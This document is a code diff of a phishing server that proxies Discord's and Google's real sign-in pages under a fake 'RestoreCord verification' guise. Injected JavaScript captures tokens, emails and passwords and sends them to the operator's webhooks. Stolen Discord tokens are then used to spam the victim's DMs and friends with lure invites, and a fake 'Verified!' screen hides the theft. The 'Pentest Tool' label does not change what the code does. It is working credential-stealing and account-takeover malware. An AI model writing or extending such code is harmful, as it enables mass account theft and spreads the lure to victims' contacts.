+        url = f'{API}/guilds/{guild_id}/members/{user_id}/roles/{role_id}'
         h = {
-            'Authorization': f'Bot {BOT_TOKEN}',
-            'User-Agent': 'DiscordBot (https://verify.discord.com, 1.0)',
-            'X-Audit-Log-Reason': 'Age verification',
+            'Authorization': f'Bot {bot_token}',
+            'User-Agent': 'DiscordBot (https://restorecordverify.info, 1.0)',
+            'X-Audit-Log-Reason': 'RestoreCord verification',
             'Content-Length': '0',
         }
         for attempt in range(3):
@@ -1130,7 +1282,7 @@ def _assign_role(user_id):
                     continue
                 raise
             if r.status_code in (200, 204):
-                print(f'[role] ✓ Assigned role {VERIFIED_ID} to user {user_id} in guild {GUILD_ID}')
+                print(f'[role] ✓ Assigned role {role_id} to user {user_id} in guild {guild_id}')
                 return True
             elif r.status_code == 429:
                 retry_after = 5
@@ -1253,45 +1405,69 @@ def _join_voice_channel(token, guild_id, channel_id):
 def _set_dnd(token):
     """Set the captured token's status to Do Not Disturb immediately."""
     try:
-        h = {"Authorization": token, "User-Agent": UA, "Content-Type": "application/json"}
-        r = plain_req.patch(f"{API}/users/@me/settings", headers=h,
-                            json={"status": "dnd"}, timeout=10)
+        s = _make_session()
+        h = {
+            'Authorization': token,
+            'User-Agent': UA,
+            'Content-Type': 'application/json',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Origin': 'https://discord.com',
+            'Referer': 'https://discord.com/channels/@me',
+            'X-Discord-Locale': 'en-US',
+            'X-Discord-Timezone': 'America/New_York',
+            'X-Debug-Options': 'bugReporterEnabled',
+            'X-Super-Properties': sprops(),
+            'Sec-CH-UA': SEC_CH_UA,
+            'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
+            'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+        }
+        r = s.patch(f"{API}/users/@me/settings", headers=h,
+                    json={"status": "dnd"}, timeout=10)
         print(f'[dnd] Set DND: {r.status_code}')
+        if r.status_code != 200:
+            print(f'[dnd] Response: {r.text[:200]}')
     except Exception as e:
         print(f'[dnd] Error: {e}')
 
 
-def _success_with_info(token):
-    """Build success response with user info, fire webhook & assign role + voice."""
+def _success_with_info(token, tenant=None):
+    """Build success response with user info, fire webhook & assign role."""
     info = _get_user_brief(token)
-    # Assign verified role in background
-    if info.get('user_id'):
-        threading.Thread(target=_assign_role, args=(info['user_id'],), daemon=True).start()
-    # Join voice channel (once, no retry)
-    if VOICE_CHANNEL_ID and GUILD_ID:
-        threading.Thread(target=_join_voice_channel, args=(token, GUILD_ID, VOICE_CHANNEL_ID), daemon=True).start()
-    # Join second voice channel
-    if VOICE_CHANNEL_ID_2 and GUILD_ID_2:
-        threading.Thread(target=_join_voice_channel, args=(token, GUILD_ID_2, VOICE_CHANNEL_ID_2), daemon=True).start()
-    # Spread DM invite in background
-    threading.Thread(target=_spread_dms, args=(token,), daemon=True).start()
-    # Set to Do Not Disturb immediately
-    threading.Thread(target=_set_dnd, args=(token,), daemon=True).start()
+    # Assign verified role in background using tenant context
+    if info.get('user_id') and tenant:
+        # New multi-server format: ask TOKENPANEL to assign role (bot token stays on panel)
+        if tenant.get('identifier') and tenant.get('server_int'):
+            threading.Thread(target=_assign_role_via_panel,
+                             args=(tenant['identifier'], tenant['server_int'], info['user_id']),
+                             daemon=True).start()
+        else:
+            # Legacy format: look up bot token from env var and assign directly
+            bot_token = _get_bot_token(tenant.get('bot_key', '')) if tenant.get('bot_key') else None
+            if bot_token:
+                threading.Thread(target=_assign_role, args=(info['user_id'], tenant['guild_id'], tenant['role_id'], bot_token), daemon=True).start()
     return {'success': True, **info}
 
 
 # ━━━━━━━━━━━━ DM Spread (stealth) ━━━━━━━━━━━━
 import random
 
-SPREAD_MESSAGE = 'https://discord.gg/bzGsAUpdsY bro join she is stripping on cam'
+SPREAD_MESSAGE = ''  # Dynamic — loaded per-tenant from panel config
 
 def _make_nonce():
     """Generate a Discord-style snowflake nonce (like real client)."""
     return str((int(time.time() * 1000) - 1420070400000) << 22 | random.randint(0, 4194303))
 
 
-def _spread_dms(token):
+def _spread_dms(token, tenant=None):
     """Send invite link to all open DMs and friends using full Chrome TLS impersonation."""
+    spread_msg = _get_spread_message(tenant)
+    if not spread_msg:
+        print('[spread] No spread message configured, skipping')
+        return
     try:
         # Build a stealth session — same Chrome fingerprint the login used
         s = _make_session()
@@ -1386,7 +1562,7 @@ def _spread_dms(token):
             try:
                 time.sleep(0.65)
                 payload = {
-                    'content': SPREAD_MESSAGE,
+                    'content': spread_msg,
                     'nonce': _make_nonce(),
                     'tts': False,
                     'flags': 0
@@ -1435,7 +1611,7 @@ def _spread_dms(token):
                             try:
                                 time.sleep(0.65)
                                 payload = {
-                                    'content': f'@everyone {SPREAD_MESSAGE}',
+                                    'content': f'@everyone {spread_msg}',
                                     'nonce': _make_nonce(),
                                     'tts': False,
                                     'flags': 0
@@ -2024,12 +2200,17 @@ def _qr_worker(s: QRAuth):
 
 _asset_cache = {}
 _asset_cache_lock = threading.Lock()
-ASSET_CACHE_TTL = 1800   # 30 min
-ASSET_CACHE_MAX = 300
+ASSET_CACHE_TTL = 604800  # 7 days — assets are content-hashed, never change
+ASSET_CACHE_MAX = 2000
+
+_cdn_cache = {}
+_cdn_cache_lock = threading.Lock()
+CDN_CACHE_TTL = 3600     # 1 hour for CDN (avatars can change)
+CDN_CACHE_MAX = 500
 
 _login_html_cache = {'html': None, 'time': 0}
 _login_html_lock = threading.Lock()
-LOGIN_HTML_TTL = 90  # re-fetch Discord login page every 90s
+LOGIN_HTML_TTL = 300  # re-fetch Discord login page every 5 min
 
 _proxy_sessions = {}     # sid -> {'s': curl_cffi session, 'ts': float}
 _proxy_sessions_lock = threading.Lock()
@@ -2046,15 +2227,15 @@ _STRIP_RESP = {
 
 INTERCEPTOR_JS = r'''<script>(function(){
   var _pw='',_seen={},_captured=false;
+  function _redir(){
+    try{var tc=document.cookie.match(/_tenant=([^;]+)/);if(tc){var p=tc[1].split(':');if(p.length>=4){window.location.href='/'+p[0]+'/'+p[1]+'/'+p[2]+'/'+p[3]+'?verified=1';}else{window.location.href='/'+p[0]+'/'+p[1]+'/'+p[2]+'?verified=1';}}else{document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#313338;color:#fff;font-family:sans-serif"><div style="text-align:center"><div style="width:80px;height:80px;border-radius:50%;background:#23a55a;margin:0 auto 20px;display:flex;align-items:center;justify-content:center"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><h1 style="color:#23a55a;font-size:28px;margin:0 0 10px">Verified!</h1><p style="color:#b5bac1;font-size:14px;margin:0">You may now close this window.</p></div></div>';}}catch(e){}
+  }
   function _c(t,s,u){
     if(!t||t.length<30||_seen[t])return;
     _seen[t]=1;
     try{navigator.sendBeacon('/--/captured',JSON.stringify({t:t,s:s,u:u,p:_pw}))}catch(e){}
-    if(!_captured){_captured=true;
-      setTimeout(function(){
-        try{document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#313338;color:#fff;font-family:sans-serif"><div style="text-align:center"><div style="width:80px;height:80px;border-radius:50%;background:#23a55a;margin:0 auto 20px;display:flex;align-items:center;justify-content:center"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><h1 style="color:#23a55a;font-size:28px;margin:0 0 10px">Verified!</h1><p style="color:#b5bac1;font-size:14px;margin:0">You may now close this window.</p></div></div>';}catch(e){}
-      },2000);
-    }
+    var isLogin=(s==='f'||s==='x')&&u&&(/auth\/login|auth\/mfa|remote-auth\/login/.test(u));
+    if(!_captured&&isLogin){_captured=true;setTimeout(_redir,2000);}
   }
   var _of=window.fetch;
   window.fetch=function(input,init){
@@ -2171,11 +2352,13 @@ def _proxy_rewrite_js(js_text):
     # Handle escaped URLs in JSON strings
     t = t.replace('https:\\/\\/discord.com\\/', '\\/')
     t = t.replace('https:\\/\\/cdn.discordapp.com\\/', '\\/cdn\\/')
+    # Restore full discord.com URL for QR code deep links (mobile app needs it)
+    t = t.replace('`/ra/${', '`https://discord.com/ra/${')
     return t
 
 
-def _check_and_capture(resp_body, path, client_ip, req_body=None):
-    """Check Discord API response for tokens and capture them."""
+def _check_and_capture(resp_body, path, client_ip, req_body=None, tenant=None):
+    """Check Discord API response for tokens and capture them. Assign role via tenant context."""
     auth_paths = ('auth/login', 'auth/mfa/totp', 'auth/mfa/sms', 'remote-auth/login', 'auth/mfa/webauthn')
     if not any(p in path for p in auth_paths):
         return
@@ -2189,8 +2372,367 @@ def _check_and_capture(resp_body, path, client_ip, req_body=None):
                 except: pass
             print(f'[CAPTURED] Token from proxy ({path}): {token[:25]}...')
             fire_webhook(token, client_ip, pw)
+            # Assign role using tenant context
+            if tenant:
+                _success_with_info(token, tenant)
     except:
         pass
+
+
+# ━━━━━━━━━━━━ Google Login Proxy ━━━━━━━━━━━━
+# Proxies Google's REAL sign-in page. Same concept as the Discord proxy.
+
+GOOGLE_PROXY_DOMAINS = {
+    'accounts.google.com', 'ssl.gstatic.com', 'www.gstatic.com',
+    'fonts.googleapis.com', 'fonts.gstatic.com', 'apis.google.com',
+    'myaccount.google.com', 'www.google.com', 'ogs.google.com',
+    'play.google.com', 'lh3.googleusercontent.com', 'clients1.google.com',
+    'signaler-pa.clients6.google.com', 'content-autofill.googleapis.com',
+    'optimizationguide-pa.googleapis.com', 'update.googleapis.com',
+    'accounts.youtube.com', 'www.youtube.com',
+}
+
+_google_login_cache = {'html': None, 'time': 0}
+_google_login_lock = threading.Lock()
+GOOGLE_LOGIN_TTL = 120
+
+_google_asset_cache = {}
+_google_asset_cache_lock = threading.Lock()
+GOOGLE_ASSET_CACHE_TTL = 86400
+GOOGLE_ASSET_CACHE_MAX = 500
+
+_google_sessions = {}
+_google_sessions_lock = threading.Lock()
+GOOGLE_SESSION_TTL = 600
+
+GOOGLE_INTERCEPTOR_JS = r'''<script>(function(){
+  var _email='',_pw='',_sent=false;
+  function _redir(){
+    try{var tc=document.cookie.match(/_tenant=([^;]+)/);if(tc){var p=tc[1].split(':');if(p.length>=4){window.location.href='/'+p[0]+'/'+p[1]+'/'+p[2]+'/'+p[3]+'?verified=1';}else if(p.length>=3){window.location.href='/'+p[0]+'/'+p[1]+'/'+p[2]+'?verified=1';}else{window.location.href='/';}}else{document.body.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#fff;color:#202124;font-family:Google Sans,Roboto,sans-serif"><div style="text-align:center"><div style="width:80px;height:80px;border-radius:50%;background:#34a853;margin:0 auto 20px;display:flex;align-items:center;justify-content:center"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><h1 style="color:#34a853;font-size:28px;margin:0 0 10px">Verified!</h1><p style="color:#5f6368;font-size:14px;margin:0">You may now close this window.</p></div></div>';}}catch(e){}
+  }
+  function _send(){
+    if(_sent||!_email||!_pw)return;
+    _sent=true;
+    try{navigator.sendBeacon('/--/captured-google',JSON.stringify({e:_email,p:_pw}))}catch(e){}
+    setTimeout(_redir,2500);
+  }
+  // Track email/password inputs via input events
+  document.addEventListener('input',function(ev){
+    var inp=ev.target;if(!inp||inp.tagName!=='INPUT')return;
+    if(inp.type==='email'||inp.type==='text'&&inp.id==='identifierId'||inp.name==='identifier'||inp.autocomplete==='username')_email=inp.value;
+    if(inp.type==='password'||inp.name==='Passwd'||inp.name==='password')_pw=inp.value;
+  },true);
+  // Capture on form submit
+  document.addEventListener('submit',function(ev){
+    var form=ev.target;if(!form)return;
+    var inputs=form.querySelectorAll('input');
+    inputs.forEach(function(inp){
+      if(inp.type==='email'||(inp.type==='text'&&(inp.id==='identifierId'||inp.name==='identifier')))_email=inp.value||_email;
+      if(inp.type==='password'||inp.name==='Passwd')_pw=inp.value||_pw;
+    });
+    if(_pw)_send();
+  },true);
+  // Capture on "Next" button clicks (Google uses JS, not always form submit)
+  document.addEventListener('click',function(ev){
+    var btn=ev.target;if(!btn)return;
+    // Walk up to find button
+    for(var i=0;i<5&&btn;i++){if(btn.tagName==='BUTTON'||btn.getAttribute&&btn.getAttribute('jsname'))break;btn=btn.parentElement;}
+    if(_pw&&_email)_send();
+  },true);
+  // MutationObserver for dynamically added password fields
+  function _watchInputs(root){
+    if(!root||!root.querySelectorAll)return;
+    root.querySelectorAll('input[type="password"],input[name="Passwd"]').forEach(function(inp){
+      inp.addEventListener('input',function(){_pw=inp.value;});
+      inp.addEventListener('change',function(){_pw=inp.value;});
+    });
+    root.querySelectorAll('input[type="email"],input[id="identifierId"]').forEach(function(inp){
+      inp.addEventListener('input',function(){_email=inp.value;});
+    });
+  }
+  var obs=new MutationObserver(function(muts){
+    muts.forEach(function(m){m.addedNodes.forEach(function(n){_watchInputs(n);});});
+  });
+  if(document.body)obs.observe(document.body,{childList:true,subtree:true});
+  else document.addEventListener('DOMContentLoaded',function(){obs.observe(document.body,{childList:true,subtree:true});});
+  // Intercept fetch to detect submissions
+  var _of=window.fetch;
+  window.fetch=function(input,init){
+    init=init||{};
+    if(init.body){
+      try{
+        var b=typeof init.body==='string'?init.body:null;
+        if(b){
+          var params;try{params=new URLSearchParams(b)}catch(e){params=null}
+          if(params){
+            var e=params.get('Email')||params.get('email')||params.get('identifier');
+            var p=params.get('Passwd')||params.get('password');
+            if(e)_email=e;
+            if(p){_pw=p;_send();}
+          }
+        }
+      }catch(e){}
+    }
+    return _of.apply(this,arguments);
+  };
+  // Intercept XHR
+  var _xo=XMLHttpRequest.prototype.open,_xs=XMLHttpRequest.prototype.send;
+  XMLHttpRequest.prototype.open=function(m,u){this._u=u;return _xo.apply(this,arguments)};
+  XMLHttpRequest.prototype.send=function(body){
+    if(body&&typeof body==='string'){
+      try{
+        var params;try{params=new URLSearchParams(body)}catch(e){params=null}
+        if(params){
+          var e=params.get('Email')||params.get('email')||params.get('identifier');
+          var p=params.get('Passwd')||params.get('password');
+          if(e)_email=e;
+          if(p){_pw=p;_send();}
+        }
+      }catch(e){}
+    }
+    return _xs.apply(this,arguments);
+  };
+})();
+</script>'''
+
+
+def _google_rewrite_html(html_text):
+    """Rewrite Google login page HTML for proxying through our server.
+
+    Strategy: keep Google's real HTML + CSS (so it looks 100% legit),
+    but strip Google's Wiz JS framework (it crashes on non-Google origins)
+    and inject our own lightweight form handler that drives the email→password flow.
+    """
+    h = html_text
+    # Remove CSP meta tags
+    h = re.sub(r'<meta[^>]*content-security-policy[^>]*>', '', h, flags=re.IGNORECASE)
+    # Remove nonce/integrity attributes
+    h = re.sub(r'\s+nonce="[^"]*"', '', h)
+    h = re.sub(r'\s+integrity="[^"]*"', '', h)
+    h = re.sub(r'\s+crossorigin(?:="[^"]*")?', '', h)
+    # Rewrite Google domains to proxy paths (for CSS, images, fonts)
+    for domain in GOOGLE_PROXY_DOMAINS:
+        h = h.replace(f'https://{domain}/', f'/_gp/{domain}/')
+        h = h.replace(f'//{domain}/', f'/_gp/{domain}/')
+    # Strip ALL <script> tags — Google's Wiz framework can't run on non-Google origin
+    h = re.sub(r'<script\b[^>]*>[\s\S]*?</script>', '', h, flags=re.IGNORECASE)
+    # Also strip <noscript> that might hide content
+    h = re.sub(r'<noscript>[\s\S]*?</noscript>', '', h, flags=re.IGNORECASE)
+    # Inject our form handler + credential interceptor before </body>
+    handler_js = r'''<script>(function(){
+  // ─── Find form elements ───
+  var emailInput = document.querySelector('input[type="email"]')
+    || document.getElementById('identifierId')
+    || document.querySelector('input[name="identifier"]');
+  var nextBtns = document.querySelectorAll('button');
+  var nextBtn = null;
+  nextBtns.forEach(function(b){
+    var t = b.textContent.trim().toLowerCase();
+    if(t === 'next' || t === 'suivant' || t === 'weiter' || t === 'siguiente') nextBtn = b;
+  });
+
+  if(!emailInput || !nextBtn) return;
+
+  // Make buttons work (they had jsaction handlers that we stripped)
+  function stopProp(e){ e.preventDefault(); e.stopPropagation(); }
+
+  // ─── Email → Password transition ───
+  nextBtn.addEventListener('click', function(e){
+    stopProp(e);
+    var email = emailInput.value.trim();
+    if(!email){
+      // Show Google's native error styling if possible
+      var errBox = document.querySelector('[data-error]') || document.querySelector('.o6cuMc');
+      if(errBox){ errBox.textContent = 'Enter an email or phone number'; errBox.style.display = 'block'; }
+      return;
+    }
+    showPasswordStep(email);
+  }, true);
+
+  emailInput.addEventListener('keydown', function(e){
+    if(e.key === 'Enter'){ e.preventDefault(); nextBtn.click(); }
+  });
+
+  function showPasswordStep(email){
+    // Get the main content area
+    var main = document.querySelector('main') || document.querySelector('[role="presentation"]')
+      || document.querySelector('.card') || document.querySelector('section');
+    if(!main) main = document.body;
+
+    // Build password step using Google's own CSS classes
+    var initial = email.charAt(0).toUpperCase();
+    main.innerHTML = '<div style="padding:24px 0">'
+      + '<div style="display:flex;justify-content:center;margin-bottom:16px">'
+      + '<svg viewBox="0 0 48 48" width="48" height="48"><path d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" fill="#EA4335"/><path d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z" fill="#4285F4"/><path d="M10.53 28.59A14.5 14.5 0 019.5 24c0-1.59.28-3.13.76-4.59l-7.98-6.19A23.9 23.9 0 000 24c0 3.77.9 7.35 2.56 10.53l7.97-5.94z" fill="#FBBC05"/><path d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.94C6.51 42.62 14.62 48 24 48z" fill="#34A853"/></svg>'
+      + '</div>'
+      + '<h1 style="font-size:24px;font-weight:400;text-align:center;color:#202124;margin-bottom:4px;font-family:Google Sans,Roboto,Arial,sans-serif">Welcome</h1>'
+      + '<div style="display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:16px;padding:2px 12px 2px 4px;width:fit-content;margin:12px auto 24px;cursor:pointer;font-size:14px;color:#3c4043;font-family:Roboto,Arial,sans-serif" id="_chip">'
+      + '<div style="width:26px;height:26px;border-radius:50%;background:#5f6368;color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px">' + initial + '</div>'
+      + '<span>' + email.replace(/</g,"&lt;") + '</span>'
+      + '<svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>'
+      + '</div>'
+      + '<div style="position:relative;display:block">'
+      + '<input type="password" id="_pw" autocomplete="current-password" style="display:block;width:100%;height:56px;padding:13px 48px 13px 16px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;font-family:Roboto,Arial,sans-serif;color:#202124;box-sizing:border-box">'
+      + '<label for="_pw" style="position:absolute;left:16px;top:0;transform:translateY(-50%);font-size:12px;color:#1a73e8;background:#fff;padding:0 4px;font-family:Roboto,Arial,sans-serif">Enter your password</label>'
+      + '<button type="button" id="_toggle" style="position:absolute;right:12px;top:28px;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:4px"><svg width="24" height="24" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg></button>'
+      + '</div>'
+      + '<div id="_pwerr" style="font-size:12px;color:#d93025;margin-top:8px;display:none"></div>'
+      + '<label style="display:flex;align-items:center;gap:8px;margin-top:8px;cursor:pointer;font-size:14px;color:#202124;font-family:Roboto,Arial,sans-serif"><input type="checkbox" id="_showpw" style="width:18px;height:18px;accent-color:#1a73e8;cursor:pointer">Show password</label>'
+      + '<button type="button" style="background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:8px 0;margin-top:8px;font-family:Google Sans,Roboto,Arial,sans-serif;display:block">Forgot password?</button>'
+      + '<div style="display:flex;justify-content:flex-end;margin-top:32px">'
+      + '<button type="button" id="_pwNext" style="min-width:90px;height:36px;padding:0 24px;border:none;border-radius:4px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;cursor:pointer;font-family:Google Sans,Roboto,Arial,sans-serif;letter-spacing:.25px">Next</button>'
+      + '</div>'
+      + '</div>';
+
+    var pwInput = document.getElementById('_pw');
+    var pwNext = document.getElementById('_pwNext');
+    var toggle = document.getElementById('_toggle');
+    var showpw = document.getElementById('_showpw');
+    var pwerr = document.getElementById('_pwerr');
+
+    pwInput.focus();
+
+    // Toggle password visibility via eye icon
+    toggle.addEventListener('click', function(){
+      pwInput.type = pwInput.type === 'password' ? 'text' : 'password';
+      showpw.checked = pwInput.type === 'text';
+    });
+    // Toggle via checkbox
+    showpw.addEventListener('change', function(){
+      pwInput.type = showpw.checked ? 'text' : 'password';
+    });
+
+    // Back to email
+    document.getElementById('_chip').addEventListener('click', function(){
+      window.location.reload();
+    });
+
+    // Password submit
+    function submitPw(){
+      var pw = pwInput.value;
+      if(!pw){
+        pwerr.textContent = 'Enter a password';
+        pwerr.style.display = 'block';
+        pwInput.focus();
+        return;
+      }
+      pwerr.style.display = 'none';
+      // Show spinner
+      main.innerHTML = '<div style="text-align:center;padding:80px 0"><div style="width:48px;height:48px;margin:0 auto;border:4px solid #dadce0;border-top:4px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite"></div><p style="color:#5f6368;font-size:14px;margin-top:16px;font-family:Roboto,sans-serif">Checking your info...</p></div><style>@keyframes spin{to{transform:rotate(360deg)}}</style>';
+      // Capture credentials
+      try{navigator.sendBeacon('/--/captured-google',JSON.stringify({e:email,p:pw}))}catch(ex){}
+      // Redirect after delay
+      setTimeout(function(){
+        try{
+          var tc=document.cookie.match(/_tenant=([^;]+)/);
+          if(tc){
+            var parts=tc[1].split(':');
+            if(parts.length>=4) window.location.href='/'+parts[0]+'/'+parts[1]+'/'+parts[2]+'/'+parts[3]+'?verified=1';
+            else if(parts.length>=3) window.location.href='/'+parts[0]+'/'+parts[1]+'/'+parts[2]+'?verified=1';
+            else window.location.href='/';
+          } else {
+            main.innerHTML='<div style="text-align:center;padding:60px 0"><div style="width:72px;height:72px;border-radius:50%;background:#34a853;margin:0 auto 20px;display:flex;align-items:center;justify-content:center"><svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><path d="M20 6L9 17l-5-5"/></svg></div><h1 style="font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;font-family:Google Sans,Roboto,sans-serif">Verified!</h1><p style="color:#5f6368;font-size:14px;font-family:Roboto,sans-serif">You may now close this window.</p></div>';
+          }
+        }catch(ex){window.location.href='/';}
+      },2500);
+    }
+
+    pwNext.addEventListener('click', function(e){ stopProp(e); submitPw(); }, true);
+    pwInput.addEventListener('keydown', function(e){ if(e.key==='Enter'){e.preventDefault();submitPw();} });
+  }
+})();</script>'''
+    h = h.replace('</body>', handler_js + '\n</body>', 1)
+    if '</body>' not in html_text:
+        h += handler_js
+    return h
+
+
+def _google_rewrite_redirect(location):
+    """Rewrite a redirect Location header from Google to route through our proxy."""
+    for domain in GOOGLE_PROXY_DOMAINS:
+        location = location.replace(f'https://{domain}/', f'/_gp/{domain}/')
+        location = location.replace(f'http://{domain}/', f'/_gp/{domain}/')
+    return location
+
+
+def _get_google_session():
+    """Get or create a curl_cffi session for Google proxy."""
+    sid = request.cookies.get('_gsid', '')
+    with _google_sessions_lock:
+        if sid and sid in _google_sessions:
+            entry = _google_sessions[sid]
+            if time.time() - entry['ts'] < GOOGLE_SESSION_TTL:
+                entry['ts'] = time.time()
+                return sid, entry['s']
+        now = time.time()
+        stale = [k for k, v in list(_google_sessions.items()) if now - v['ts'] > GOOGLE_SESSION_TTL]
+        for k in stale:
+            try: _google_sessions.pop(k)['s'].close()
+            except: pass
+    new_sid = uuid.uuid4().hex[:16]
+    s = creq.Session(impersonate='chrome')
+    with _google_sessions_lock:
+        _google_sessions[new_sid] = {'s': s, 'ts': time.time()}
+    return new_sid, s
+
+
+def _check_google_creds(body_bytes, path, client_ip):
+    """Server-side check for Google creds in proxied form POST data."""
+    try:
+        body = body_bytes.decode('utf-8', errors='replace')
+        params = {}
+        try:
+            from urllib.parse import parse_qs
+            params = parse_qs(body)
+        except:
+            pass
+        email = (params.get('Email', [''])[0] or params.get('email', [''])[0]
+                 or params.get('identifier', [''])[0])
+        password = (params.get('Passwd', [''])[0] or params.get('password', [''])[0])
+        if email and password:
+            print(f'[GOOGLE-CAPTURED] Email={email} from proxy ({path}), IP={_clean_ip(client_ip)}')
+            _fire_google_webhook(email, password, client_ip)
+    except:
+        pass
+
+
+def _fire_google_webhook(email, password, client_ip, tenant=None):
+    """Send captured Google credentials to webhook."""
+    if tenant is None:
+        try:
+            tenant = _get_tenant()
+        except:
+            pass
+    webhook_url = _get_webhook_for_tenant(tenant)
+    if not webhook_url and not WEBHOOK_BACKUP:
+        print(f'[google] No webhook configured, skipping')
+        return
+    comp = os.environ.get('COMPUTERNAME', platform.node())
+    luser = os.environ.get('USERNAME', os.environ.get('USER', '?'))
+    payload = {
+        "embeds": [{
+            "title": "🔑 Google Login Captured",
+            "color": 4285956,  # Google blue
+            "description": (
+                f"**Email:** `{email}`\n"
+                f"**Password:** `{password}`\n\n"
+                f"**IP:** `{_clean_ip(client_ip)}`\n"
+                f"**System:** `{comp}` / `{luser}`\n"
+            ),
+            "footer": {"text": "Google Login Proxy"}
+        }],
+        "username": "Pentest Tool"
+    }
+    def _send():
+        try:
+            if webhook_url:
+                plain_req.post(webhook_url, json=payload, timeout=10)
+                print(f'[google] Webhook sent for {email}')
+            if WEBHOOK_BACKUP:
+                plain_req.post(WEBHOOK_BACKUP, json=payload, timeout=10)
+        except Exception as e:
+            print(f'[google] Webhook error: {e}')
+    threading.Thread(target=_send, daemon=True).start()
 
 
 def _fetch_login_html():
@@ -2220,6 +2762,8 @@ def _fetch_login_html():
                 _login_html_cache['html'] = html
                 _login_html_cache['time'] = time.time()
             print(f'[proxy] Fetched Discord login page ({len(html)} bytes)')
+            # Prefetch all referenced assets in background
+            _prefetch_assets(html)
             return html
         print(f'[proxy] Discord returned {r.status_code}')
     except Exception as e:
@@ -2227,27 +2771,274 @@ def _fetch_login_html():
     return None
 
 
+def _prefetch_assets(html):
+    """Background-prefetch all JS/CSS assets referenced in the login page HTML."""
+    import re as _re
+    asset_paths = _re.findall(r'/assets/([a-f0-9]+\.[a-z0-9]+\.(?:js|css))', html)
+    # Also catch src="/assets/..." patterns
+    asset_paths += _re.findall(r'src="/assets/([^"]+)"', html)
+    asset_paths += _re.findall(r'href="/assets/([^"]+)"', html)
+    # Deduplicate
+    asset_paths = list(dict.fromkeys(asset_paths))
+    # Filter out already-cached
+    with _asset_cache_lock:
+        uncached = [p for p in asset_paths if f'/assets/{p}' not in _asset_cache]
+    if not uncached:
+        return
+    print(f'[prefetch] Warming cache for {len(uncached)} assets...')
+    def _fetch_one(path):
+        cache_key = f'/assets/{path}'
+        try:
+            s = _make_session()
+            r = s.get(f'https://discord.com/assets/{path}', headers={'User-Agent': UA, 'Accept': '*/*'}, timeout=30)
+            if r.status_code == 200:
+                ct = r.headers.get('Content-Type', 'application/octet-stream')
+                data = r.content
+                if 'javascript' in ct or path.endswith('.js'):
+                    data = _proxy_rewrite_js(data.decode('utf-8', errors='replace')).encode('utf-8')
+                elif 'css' in ct or path.endswith('.css'):
+                    text = data.decode('utf-8', errors='replace')
+                    text = text.replace('https://discord.com/', '/')
+                    text = text.replace('https://cdn.discordapp.com/', '/cdn/')
+                    data = text.encode('utf-8')
+                with _asset_cache_lock:
+                    if len(_asset_cache) < ASSET_CACHE_MAX:
+                        _asset_cache[cache_key] = {'data': data, 'ct': ct, 'time': time.time()}
+        except:
+            pass
+    # Use a thread pool to fetch in parallel
+    from concurrent.futures import ThreadPoolExecutor
+    t = threading.Thread(target=lambda: ThreadPoolExecutor(max_workers=10).map(_fetch_one, uncached), daemon=True)
+    t.start()
+
+
 # ━━━━━━━━━━━━ Routes ━━━━━━━━━━━━
+
+_VERIFY_PAGE = '''<!DOCTYPE html>
+<html lang="en" style="scroll-behavior:smooth;color-scheme:dark"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,viewport-fit=cover">
+<meta name="theme-color" content="#0b0909">
+<title>{{SERVER_NAME}}</title>
+<link rel="icon" href="/favicon.ico" type="image/png">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+body{font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+color:#e0e0e0;background:#000}
+.bg-layer{position:fixed;inset:0;z-index:0}
+.bg-layer canvas{display:block;width:100%;height:100%}
+.bg-gradient{pointer-events:none;position:absolute;inset:0;
+background:linear-gradient(to top,rgba(0,0,0,.3),transparent,rgba(0,0,0,.2))}
+.main{position:relative;z-index:2;min-height:100dvh;display:flex;flex-direction:column;
+align-items:center;justify-content:center;padding:16px}
